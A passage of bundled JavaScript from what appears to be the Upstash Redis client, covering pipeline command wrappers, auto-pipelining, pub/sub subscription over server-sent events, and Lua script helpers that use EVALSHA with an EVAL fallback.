       * @see https://redis.io/commands/hexpiretime
       */
      hexpiretime = (...args) => this.chain(new HExpireTimeCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/httl
       */
      httl = (...args) => this.chain(new HTtlCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/hpexpire
       */
      hpexpire = (...args) => this.chain(new HPExpireCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/hpexpireat
       */
      hpexpireat = (...args) => this.chain(new HPExpireAtCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/hpexpiretime
       */
      hpexpiretime = (...args) => this.chain(new HPExpireTimeCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/hpttl
       */
      hpttl = (...args) => this.chain(new HPTtlCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/hpersist
       */
      hpersist = (...args) => this.chain(new HPersistCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/hget
       */
      hget = (...args) => this.chain(new HGetCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/hgetall
       */
      hgetall = (...args) => this.chain(new HGetAllCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/hincrby
       */
      hincrby = (...args) => this.chain(new HIncrByCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/hincrbyfloat
       */
      hincrbyfloat = (...args) => this.chain(new HIncrByFloatCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/hkeys
       */
      hkeys = (...args) => this.chain(new HKeysCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/hlen
       */
      hlen = (...args) => this.chain(new HLenCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/hmget
       */
      hmget = (...args) => this.chain(new HMGetCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/hmset
       */
      hmset = (key, kv) => this.chain(new HMSetCommand([key, kv], this.commandOptions));
      /**
       * @see https://redis.io/commands/hrandfield
       */
      hrandfield = (key, count, withValues) => this.chain(new HRandFieldCommand([key, count, withValues], this.commandOptions));
      /**
       * @see https://redis.io/commands/hscan
       */
      hscan = (...args) => this.chain(new HScanCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/hset
       */
      hset = (key, kv) => this.chain(new HSetCommand([key, kv], this.commandOptions));
      /**
       * @see https://redis.io/commands/hsetnx
       */
      hsetnx = (key, field, value) => this.chain(new HSetNXCommand([key, field, value], this.commandOptions));
      /**
       * @see https://redis.io/commands/hstrlen
       */
      hstrlen = (...args) => this.chain(new HStrLenCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/hvals
       */
      hvals = (...args) => this.chain(new HValsCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/incr
       */
      incr = (...args) => this.chain(new IncrCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/incrby
       */
      incrby = (...args) => this.chain(new IncrByCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/incrbyfloat
       */
      incrbyfloat = (...args) => this.chain(new IncrByFloatCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/keys
       */
      keys = (...args) => this.chain(new KeysCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/lindex
       */
      lindex = (...args) => this.chain(new LIndexCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/linsert
       */
      linsert = (key, direction, pivot, value) => this.chain(new LInsertCommand([key, direction, pivot, value], this.commandOptions));
      /**
       * @see https://redis.io/commands/llen
       */
      llen = (...args) => this.chain(new LLenCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/lmove
       */
      lmove = (...args) => this.chain(new LMoveCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/lpop
       */
      lpop = (...args) => this.chain(new LPopCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/lmpop
       */
      lmpop = (...args) => this.chain(new LmPopCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/lpos
       */
      lpos = (...args) => this.chain(new LPosCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/lpush
       */
      lpush = (key, ...elements) => this.chain(new LPushCommand([key, ...elements], this.commandOptions));
      /**
       * @see https://redis.io/commands/lpushx
       */
      lpushx = (key, ...elements) => this.chain(new LPushXCommand([key, ...elements], this.commandOptions));
      /**
       * @see https://redis.io/commands/lrange
       */
      lrange = (...args) => this.chain(new LRangeCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/lrem
       */
      lrem = (key, count, value) => this.chain(new LRemCommand([key, count, value], this.commandOptions));
      /**
       * @see https://redis.io/commands/lset
       */
      lset = (key, index, value) => this.chain(new LSetCommand([key, index, value], this.commandOptions));
      /**
       * @see https://redis.io/commands/ltrim
       */
      ltrim = (...args) => this.chain(new LTrimCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/mget
       */
      mget = (...args) => this.chain(new MGetCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/mset
       */
      mset = (kv) => this.chain(new MSetCommand([kv], this.commandOptions));
      /**
       * @see https://redis.io/commands/msetnx
       */
      msetnx = (kv) => this.chain(new MSetNXCommand([kv], this.commandOptions));
      /**
       * @see https://redis.io/commands/persist
       */
      persist = (...args) => this.chain(new PersistCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/pexpire
       */
      pexpire = (...args) => this.chain(new PExpireCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/pexpireat
       */
      pexpireat = (...args) => this.chain(new PExpireAtCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/pfadd
       */
      pfadd = (...args) => this.chain(new PfAddCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/pfcount
       */
      pfcount = (...args) => this.chain(new PfCountCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/pfmerge
       */
      pfmerge = (...args) => this.chain(new PfMergeCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/ping
       */
      ping = (args) => this.chain(new PingCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/psetex
       */
      psetex = (key, ttl, value) => this.chain(new PSetEXCommand([key, ttl, value], this.commandOptions));
      /**
       * @see https://redis.io/commands/pttl
       */
      pttl = (...args) => this.chain(new PTtlCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/publish
       */
      publish = (...args) => this.chain(new PublishCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/randomkey
       */
      randomkey = () => this.chain(new RandomKeyCommand(this.commandOptions));
      /**
       * @see https://redis.io/commands/rename
       */
      rename = (...args) => this.chain(new RenameCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/renamenx
       */
      renamenx = (...args) => this.chain(new RenameNXCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/rpop
       */
      rpop = (...args) => this.chain(new RPopCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/rpush
       */
      rpush = (key, ...elements) => this.chain(new RPushCommand([key, ...elements], this.commandOptions));
      /**
       * @see https://redis.io/commands/rpushx
       */
      rpushx = (key, ...elements) => this.chain(new RPushXCommand([key, ...elements], this.commandOptions));
      /**
       * @see https://redis.io/commands/sadd
       */
      sadd = (key, member, ...members) => this.chain(new SAddCommand([key, member, ...members], this.commandOptions));
      /**
       * @see https://redis.io/commands/scan
       */
      scan = (...args) => this.chain(new ScanCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/scard
       */
      scard = (...args) => this.chain(new SCardCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/script-exists
       */
      scriptExists = (...args) => this.chain(new ScriptExistsCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/script-flush
       */
      scriptFlush = (...args) => this.chain(new ScriptFlushCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/script-load
       */
      scriptLoad = (...args) => this.chain(new ScriptLoadCommand(args, this.commandOptions));
      /*)*
       * @see https://redis.io/commands/sdiff
       */
      sdiff = (...args) => this.chain(new SDiffCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/sdiffstore
       */
      sdiffstore = (...args) => this.chain(new SDiffStoreCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/set
       */
      set = (key, value, opts) => this.chain(new SetCommand([key, value, opts], this.commandOptions));
      /**
       * @see https://redis.io/commands/setbit
       */
      setbit = (...args) => this.chain(new SetBitCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/setex
       */
      setex = (key, ttl, value) => this.chain(new SetExCommand([key, ttl, value], this.commandOptions));
      /**
       * @see https://redis.io/commands/setnx
       */
      setnx = (key, value) => this.chain(new SetNxCommand([key, value], this.commandOptions));
      /**
       * @see https://redis.io/commands/setrange
       */
      setrange = (...args) => this.chain(new SetRangeCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/sinter
       */
      sinter = (...args) => this.chain(new SInterCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/sinterstore
       */
      sinterstore = (...args) => this.chain(new SInterStoreCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/sismember
       */
      sismember = (key, member) => this.chain(new SIsMemberCommand([key, member], this.commandOptions));
      /**
       * @see https://redis.io/commands/smembers
       */
      smembers = (...args) => this.chain(new SMembersCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/smismember
       */
      smismember = (key, members) => this.chain(new SMIsMemberCommand([key, members], this.commandOptions));
      /**
       * @see https://redis.io/commands/smove
       */
      smove = (source, destination, member) => this.chain(new SMoveCommand([source, destination, member], this.commandOptions));
      /**
       * @see https://redis.io/commands/spop
       */
      spop = (...args) => this.chain(new SPopCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/srandmember
       */
      srandmember = (...args) => this.chain(new SRandMemberCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/srem
       */
      srem = (key, ...members) => this.chain(new SRemCommand([key, ...members], this.commandOptions));
      /**
       * @see https://redis.io/commands/sscan
       */
      sscan = (...args) => this.chain(new SScanCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/strlen
       */
      strlen = (...args) => this.chain(new StrLenCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/sunion
       */
      sunion = (...args) => this.chain(new SUnionCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/sunionstore
       */
      sunionstore = (...args) => this.chain(new SUnionStoreCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/time
       */
      time = () => this.chain(new TimeCommand(this.commandOptions));
      /**
       * @see https://redis.io/commands/touch
       */
      touch = (...args) => this.chain(new TouchCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/ttl
       */
      ttl = (...args) => this.chain(new TtlCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/type
       */
      type = (...args) => this.chain(new TypeCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/unlink
       */
      unlink = (...args) => this.chain(new UnlinkCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/zadd
       */
      zadd = (...args) => {
        if ("score" in args[1]) {
          return this.chain(
            new ZAddCommand([args[0], args[1], ...args.slice(2)], this.commandOptions)
          );
        }
        return this.chain(
          new ZAddCommand(
            [args[0], args[1], ...args.slice(2)],
            this.commandOptions
          )
        );
      };
      /**
       * @see https://redis.io/commands/xadd
       */
      xadd = (...args) => this.chain(new XAddCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/xack
       */
      xack = (...args) => this.chain(new XAckCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/xdel
       */
      xdel = (...args) => this.chain(new XDelCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/xgroup
       */
      xgroup = (...args) => this.chain(new XGroupCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/xread
       */
      xread = (...args) => this.chain(new XReadCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/xreadgroup
       */
      xreadgroup = (...args) => this.chain(new XReadGroupCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/xinfo
       */
      xinfo = (...args) => this.chain(new XInfoCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/xlen
       */
      xlen = (...args) => this.chain(new XLenCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/xpending
       */
      xpending = (...args) => this.chain(new XPendingCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/xclaim
       */
      xclaim = (...args) => this.chain(new XClaimCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/xautoclaim
       */
      xautoclaim = (...args) => this.chain(new XAutoClaim(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/xtrim
       */
      xtrim = (...args) => this.chain(new XTrimCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/xrange
       */
      xrange = (...args) => this.chain(new XRangeCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/xrevrange
       */
      xrevrange = (...args) => this.chain(new XRevRangeCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/zcard
       */
      zcard = (...args) => this.chain(new ZCardCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/zcount
       */
      zcount = (...args) => this.chain(new ZCountCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/zincrby
       */
      zincrby = (key, increment, member) => this.chain(new ZIncrByCommand([key, increment, member], this.commandOptions));
      /**
       * @see https://redis.io/commands/zinterstore
       */
      zinterstore = (...args) => this.chain(new ZInterStoreCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/zlexcount
       */
      zlexcount = (...args) => this.chain(new ZLexCountCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/zmscore
       */
      zmscore = (...args) => this.chain(new ZMScoreCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/zpopmax
       */
      zpopmax = (...args) => this.chain(new ZPopMaxCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/zpopmin
       */
      zpopmin = (...args) => this.chain(new ZPopMinCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/zrange
       */
      zrange = (...args) => this.chain(new ZRangeCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/zrank
       */
      zrank = (key, member) => this.chain(new ZRankCommand([key, member], this.commandOptions));
      /**
       * @see https://redis.io/commands/zrem
       */
      zrem = (key, ...members) => this.chain(new ZRemCommand([key, ...members], this.commandOptions));
      /**
       * @see https://redis.io/commands/zremrangebylex
       */
      zremrangebylex = (...args) => this.chain(new ZRemRangeByLexCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/zremrangebyrank
       */
      zremrangebyrank = (...args) => this.chain(new ZRemRangeByRankCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/zremrangebyscore
       */
      zremrangebyscore = (...args) => this.chain(new ZRemRangeByScoreCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/zrevrank
       */
      zrevrank = (key, member) => this.chain(new ZRevRankCommand([key, member], this.commandOptions));
      /**
       * @see https://redis.io/commands/zscan
       */
      zscan = (...args) => this.chain(new ZScanCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/zscore
       */
      zscore = (key, member) => this.chain(new ZScoreCommand([key, member], this.commandOptions));
      /**
       * @see https://redis.io/commands/zunionstore
       */
      zunionstore = (...args) => this.chain(new ZUnionStoreCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/zunion
       */
      zunion = (...args) => this.chain(new ZUnionCommand(args, this.commandOptions));
      /**
       * @see https://redis.io/commands/?group=json
       */
      get json() {
        return {
          /**
           * @see https://redis.io/commands/json.arrappend
           */
          arrappend: (...args) => this.chain(new JsonArrAppendCommand(args, this.commandOptions)),
          /**
           * @see https://redis.io/commands/json.arrindex
           */
          arrindex: (...args) => this.chain(new JsonArrIndexCommand(args, this.commandOptions)),
          /**
           * @see https://redis.io/commands/json.arrinsert
           */
          arrinsert: (...args) => this.chain(new JsonArrInsertCommand(args, this.commandOptions)),
          /**
           * @see https://redis.io/commands/json.arrlen
           */
          arrlen: (...args) => this.chain(new JsonArrLenCommand(args, this.commandOptions)),
          /**
           * @see https://redis.io/commands/json.arrpop
           */
          arrpop: (...args) => this.chain(new JsonArrPopCommand(args, this.commandOptions)),
          /**
           * @see https://redis.io/commands/json.arrtrim
           */
          arrtrim: (...args) => this.chain(new JsonArrTrimCommand(args, this.commandOptions)),
          /**
           * @see https://redis.io/commands/json.clear
           */
          clear: (...args) => this.chain(new JsonClearCommand(args, this.commandOptions)),
          /**
           * @see https://redis.io/commands/json.del
           */
          del: (...args) => this.chain(new JsonDelCommand(args, this.commandOptions)),
          /**
           * @see https://redis.io/commands/json.forget
           */
          forget: (...args) => this.chain(new JsonForgetCommand(args, this.commandOptions)),
          /**
           * @see https://redis.io/commands/json.get
           */
          get: (...args) => this.chain(new JsonGetCommand(args, this.commandOptions)),
          /**
           * @see https://redis.io/commands/json.merge
           */
          merge: (...args) => this.chain(new JsonMergeCommand(args, this.commandOptions)),
          /**
           * @see https://redis.io/commands/json.mget
           */
          mget: (...args) => this.chain(new JsonMGetCommand(args, this.commandOptions)),
          /**
           * @see https://redis.io/commands/json.mset
           */
          mset: (...args) => this.chain(new JsonMSetCommand(args, this.commandOptions)),
          /**
           * @see https://redis.io/commands/json.numincrby
           */
          numincrby: (...args) => this.chain(new JsonNumIncrByCommand(args, this.commandOptions)),
          /**
           * @see https://redis.io/commands/json.nummultby
           */
          nummultby: (...args) => this.chain(new JsonNumMultByCommand(args, this.commandOptions)),
          /**
           * @see https://redis.io/commands/json.objkeys
           */
          objkeys: (...args) => this.chain(new JsonObjKeysCommand(args, this.commandOptions)),
          /**
           * @see https://redis.io/commands/json.objlen
           */
          objlen: (...args) => this.chain(new JsonObjLenCommand(args, this.commandOptions)),
          /**
           * @see https://redis.io/commands/json.resp
           */
          resp: (...args) => this.chain(new JsonRespCommand(args, this.commandOptions)),
          /**
           * @see https://redis.io/commands/json.set
           */
          set: (...args) => this.chain(new JsonSetCommand(args, this.commandOptions)),
          /**
           * @see https://redis.io/commands/json.strappend
           */
          strappend: (...args) => this.chain(new JsonStrAppendCommand(args, this.commandOptions)),
          /**
           * @see https://redis.io/commands/json.strlen
           */
          strlen: (...args) => this.chain(new JsonStrLenCommand(args, this.commandOptions)),
          /**
           * @see https://redis.io/commands/json.toggle
           */
          toggle: (...args) => this.chain(new JsonToggleCommand(args, this.commandOptions)),
          /**
           * @see https://redis.io/commands/json.type
           */
          type: (...args) => this.chain(new JsonTypeCommand(args, this.commandOptions))
        };
      }
    };
    EXCLUDE_COMMANDS = /* @__PURE__ */ new Set([
      "scan",
      "keys",
      "flushdb",
      "flushall",
      "dbsize",
      "hscan",
      "hgetall",
      "hkeys",
      "lrange",
      "sscan",
      "smembers",
      "xrange",
      "xrevrange",
      "zscan",
      "zrange"
    ]);
    AutoPipelineExecutor = class {
      pipelinePromises = /* @__PURE__ */ new WeakMap();
      activePipeline = null;
      indexInCurrentPipeline = 0;
      redis;
      pipeline;
      // only to make sure that proxy can work
      pipelineCounter = 0;
      // to keep track of how many times a pipeline was executed
      constructor(redis) {
        this.redis = redis;
        this.pipeline = redis.pipeline();
      }
      async withAutoPipeline(executeWithPipeline) {
        const pipeline = this.activePipeline ?? this.redis.pipeline();
        if (!this.activePipeline) {
          this.activePipeline = pipeline;
          this.indexInCurrentPipeline = 0;
        }
        const index = this.indexInCurrentPipeline++;
        executeWithPipeline(pipeline);
        const pipelineDone = this.deferExecution().then(() => {
          if (!this.pipelinePromises.has(pipeline)) {
            const pipelinePromise = pipeline.exec({ keepErrors: true });
            this.pipelineCounter += 1;
            this.pipelinePromises.set(pipeline, pipelinePromise);
            this.activePipeline = null;
          }
          return this.pipelinePromises.get(pipeline);
        });
        const results = await pipelineDone;
        const commandResult = results[index];
        if (commandResult.error) {
          throw new UpstashError(`Command failed: ${commandResult.error}`);
        }
        return commandResult.result;
      }
      async deferExecution() {
        await Promise.resolve();
        await Promise.resolve();
      }
    };
    PSubscribeCommand = class extends Command {
      constructor(cmd, opts) {
        const sseHeaders = {
          Accept: "text/event-stream",
          "Cache-Control": "no-cache",
          Connection: "keep-alive"
        };
        super([], {
          ...opts,
          headers: sseHeaders,
          path: ["psubscribe", ...cmd],
          streamOptions: {
            isStreaming: true,
            onMessage: opts?.streamOptions?.onMessage,
            signal: opts?.streamOptions?.signal
          }
        });
      }
    };
    Subscriber = class extends EventTarget {
      subscriptions;
      client;
      listeners;
      constructor(client, channels, isPattern = false) {
        super();
        this.client = client;
        this.subscriptions = /* @__PURE__ */ new Map();
        this.listeners = /* @__PURE__ */ new Map();
        for (const channel of channels) {
          if (isPattern) {
            this.subscribeToPattern(channel);
          } else {
            this.subscribeToChannel(channel);
          }
        }
      }
      subscribeToChannel(channel) {
        const controller = new AbortController();
        const command = new SubscribeCommand([channel], {
          streamOptions: {
            signal: controller.signal,
            onMessage: (data) => this.handleMessage(data, false)
          }
        });
        command.exec(this.client).catch((error) => {
          if (error.name !== "AbortError") {
            this.dispatchToListeners("error", error);
          }
        });
        this.subscriptions.set(channel, {
          command,
          controller,
          isPattern: false
        });
      }
      subscribeToPattern(pattern) {
        const controller = new AbortController();
        const command = new PSubscribeCommand([pattern], {
          streamOptions: {
            signal: controller.signal,
            onMessage: (data) => this.handleMessage(data, true)
          }
        });
        command.exec(this.client).catch((error) => {
          if (error.name !== "AbortError") {
            this.dispatchToListeners("error", error);
          }
        });
        this.subscriptions.set(pattern, {
          command,
          controller,
          isPattern: true
        });
      }
      handleMessage(data, isPattern) {
        const messageData = data.replace(/^data:\s*/, "");
        const firstCommaIndex = messageData.indexOf(",");
        const secondCommaIndex = messageData.indexOf(",", firstCommaIndex + 1);
        const thirdCommaIndex = isPattern ? messageData.indexOf(",", secondCommaIndex + 1) : -1;
        if (firstCommaIndex !== -1 && secondCommaIndex !== -1) {
          const type = messageData.slice(0, firstCommaIndex);
          if (isPattern && type === "pmessage" && thirdCommaIndex !== -1) {
            const pattern = messageData.slice(firstCommaIndex + 1, secondCommaIndex);
            const channel = messageData.slice(secondCommaIndex + 1, thirdCommaIndex);
            const messageStr = messageData.slice(thirdCommaIndex + 1);
            try {
              const message = JSON.parse(messageStr);
              this.dispatchToListeners("pmessage", { pattern, channel, message });
              this.dispatchToListeners(`pmessage:${pattern}`, { pattern, channel, message });
            } catch (error) {
              this.dispatchToListeners("error", new Error(`Failed to parse message: ${error}`));
            }
          } else {
            const channel = messageData.slice(firstCommaIndex + 1, secondCommaIndex);
            const messageStr = messageData.slice(secondCommaIndex + 1);
            try {
              if (type === "subscribe" || type === "psubscribe" || type === "unsubscribe" || type === "punsubscribe") {
                const count = Number.parseInt(messageStr);
                this.dispatchToListeners(type, count);
              } else {
                const message = JSON.parse(messageStr);
                this.dispatchToListeners(type, { channel, message });
                this.dispatchToListeners(`${type}:${channel}`, { channel, message });
              }
            } catch (error) {
              this.dispatchToListeners("error", new Error(`Failed to parse message: ${error}`));
            }
          }
        }
      }
      dispatchToListeners(type, data) {
        const listeners = this.listeners.get(type);
        if (listeners) {
          for (const listener of listeners) {
            listener(data);
          }
        }
      }
      on(type, listener) {
        if (!this.listeners.has(type)) {
          this.listeners.set(type, /* @__PURE__ */ new Set());
        }
        this.listeners.get(type)?.add(listener);
      }
      removeAllListeners() {
        this.listeners.clear();
      }
      async unsubscribe(channels) {
        if (channels) {
          for (const channel of channels) {
            const subscription = this.subscriptions.get(channel);
            if (subscription) {
              try {
                subscription.controller.abort();
              } catch {
              }
              this.subscriptions.delete(channel);
            }
          }
        } else {
          for (const subscription of this.subscriptions.values()) {
            try {
              subscription.controller.abort();
            } catch {
            }
          }
          this.subscriptions.clear();
          this.removeAllListeners();
        }
      }
      getSubscribedChannels() {
        return [...this.subscriptions.keys()];
      }
    };
    SubscribeCommand = class extends Command {
      constructor(cmd, opts) {
        const sseHeaders = {
          Accept: "text/event-stream",
          "Cache-Control": "no-cache",
          Connection: "keep-alive"
        };
        super([], {
          ...opts,
          headers: sseHeaders,
          path: ["subscribe", ...cmd],
          streamOptions: {
            isStreaming: true,
            onMessage: opts?.streamOptions?.onMessage,
            signal: opts?.streamOptions?.signal
          }
        });
      }
    };
    Script = class {
      script;
      /**
       * @deprecated This property is initialized to an empty string and will be set in the init method
       * asynchronously. Do not use this property immidiately after the constructor.
       *
       * This property is only exposed for backwards compatibility and will be removed in the
       * future major release.
       */
      sha1;
      redis;
      constructor(redis, script) {
        this.redis = redis;
        this.script = script;
        this.sha1 = "";
        void this.init(script);
      }
      /**
       * Initialize the script by computing its SHA-1 hash.
       */
      async init(script) {
        if (this.sha1) return;
        this.sha1 = await this.digest(script);
      }
      /**
       * Send an `EVAL` command to redis.
       */
      async eval(keys, args) {
        await this.init(this.script);
        return await this.redis.eval(this.script, keys, args);
      }
      /**
       * Calculates the sha1 hash of the script and then calls `EVALSHA`.
       */
      async evalsha(keys, args) {
        await this.init(this.script);
        return await this.redis.evalsha(this.sha1, keys, args);
      }
      /**
       * Optimistically try to run `EVALSHA` first.
       * If the script is not loaded in redis, it will fall back and try again with `EVAL`.
       *
       * Following calls will be able to use the cached script
       */
      async exec(keys, args) {
        await this.init(this.script);
        const res = await this.redis.evalsha(this.sha1, keys, args).catch(async (error) => {
          if (error instanceof Error && error.message.toLowerCase().includes("noscript")) {
            return await this.redis.eval(this.script, keys, args);
          }
          throw error;
        });
        return res;
      }
      /**
       * Compute the sha1 hash of the script and return its hex representation.
       */
      async digest(s) {
        const data = new TextEncoder().encode(s);
        const hashBuffer = await subtle.digest("SHA-1", data);
        const hashArray = [...new Uint8Array(hashBuffer)];
        return hashArray.map((b) => b.toString(16).padStart(2, "0")).join("");
      }
    };
    ScriptRO = class {
      script;
      /**
       * @deprecated This property is initialized to an empty string and will be set in the init method
       * asynchronously. Do not use this property immidiately after the constructor.
       *
       * This property is only exposed for backwards compatibility and will be removed in the
       * future major release.
       */
      sha1;
      redis;
      constructor(redis, script) {
        this.redis = redis;
        this.sha1 = "";
        this.script = script;
        void this.init(script);
      }
      async init(script) {
        if (this.sha1) return;
        this.sha1 = await this.digest(script);
      }
      /**
       * Send an `EVAL_RO` command to redis.
       */
      async evalRo(keys, args) {
        await this.init(this.script);
        return await this.redis.evalRo(this.script, keys, args);
      }
      /**
       * Calculates the sha1 hash of the script and then calls `EVALSHA_RO`.
       */
      async evalshaRo(keys, args) {
        await this.init(this.script);
        return await this.redis.evalshaRo(this.sha1, keys, args);
      }
      /**
       * Optimistically try to run `EVALSHA_RO` first.
       * If the script is not loaded in redis, it will fall back and try again with `EVAL_RO`.
       *
       * Following calls will be able to use the cached script
       */
      async exec(keys, args) {
        await this.init(this.script);
        const res = await this.redis.evalshaRo(this.sha1, keys, args).catch(async (error) => {
          if (error instanceof Error && error.message.toLowerCase().includes("noscript")) {
            return await this.redis.evalRo(this.script, keys, args);
          }
          throw error;
        });
        return res;
      }
      /**
       * Compute the sha1 hash of the script and return its hex representation.
       */
      async digest(s) {
        const data = new TextEncoder().encode(s);
        const hashBuffer = await subtle.digest("SHA-1", data);
        const hashArray = [...new Uint8Array(hashBuffer)];
        return hashArray.map((b) => b.toString(16).padStart(2, "0")).join("");
      }
    };
    Redis = class {
      client;
      opts;
      enableTelemetry;
      enableAutoPipelining;
      /**
       * Create a new redis client
       *
       * @example
       * ```typescript
       * const redis = new Redis({
       *  url: "<UPSTASH_REDIS_REST_URL>",
       *  token: "<UPSTASH_REDIS_REST_TOKEN>",
       * });
       * ```
       */
      constructor(client, opts) {
        this.client = client;
        this.opts = opts;
        this.enableTelemetry = opts?.enableTelemetry ?? true;
        if (opts?.readYourWrites === false) {
          this.client.readYourWrites = false;
        }
        this.enableAutoPipelining = opts?.enableAutoPipelining ?? true;
      }
      get readYourWritesSyncToken() {
        return this.client.upstashSyncToken;
      }
      set readYourWritesSyncToken(session) {
        this.client.upstashSyncToken = session;
      }
      get json() {
        return {
          /**
           * @see https://redis.io/commands/json.arrappend
           */
          arrappend: (...args) => new JsonArrAppendCommand(args, this.opts).exec(this.client),
          /**
           * @see https://redis.io/commands/json.arrindex
           */
          arrindex: (...args) => new JsonArrIndexCommand(args, this.opts).exec(this.client),
          /**
           * @see https://redis.io/commands/json.arrinsert
           */
          arrinsert: (...args) => new JsonArrInsertCommand(args, this.opts).exec(this.client),
          /**
           * @see https://redis.io/commands/json.arrlen
           */
          arrlen: (...args) => new JsonArrLenCommand(args, this.opts).exec(this.client),
          /**
           * @see https://redis.io/commands/json.arrpop
           */
          arrpop: (...args) => new JsonArrPopCommand(args, this.opts).exec(this.client),
          /**
           * @see https://redis.io/commands/json.arrtrim
           */
          arrtrim: (...args) => new JsonArrTrimCommand(args, this.opts).exec(this.client),
          /**
           * @see https://redis.io/commands/json.clear
           */
          clear: (...args) => new JsonClearCommand(args, this.opts).exec(this.client),
          /**
           * @see https://redis.io/commands/json.del
           */
          del: (...args) => new JsonDelCommand(args, this.opts).exec(this.client),
          /**
           * @see https://redis.io/commands/json.forget
           */
          forget: (...args) => new JsonForgetCommand(args, this.opts).exec(this.client),
          /**
           * @see https://redis.io/commands/json.get
           */
          get: (...args) => new JsonGetCommand(args, this.opts).exec(this.client),
          /**
           * @see https://redis.io/commands/json.merge
           */
          merge: (...args) => new JsonMergeCommand(args, this.opts).exec(this.client),
          /**
           * @see https://redis.io/commands/json.mget
           */
          mget: (...args) => new JsonMGetCommand(args, this.opts).exec(this.client),
          /**
           * @see https://redis.io/commands/json.mset
           */
          mset: (...args) => new JsonMSetCommand(args, this.opts).exec(this.client),
          /**
           * @see https://redis.io/commands/json.numincrby
           */
          numincrby: (...args) => new JsonNumIncrByCommand(args, this.opts).exec(this.client),
          /**
           * @see https://redis.io/commands/json.nummultby
           */
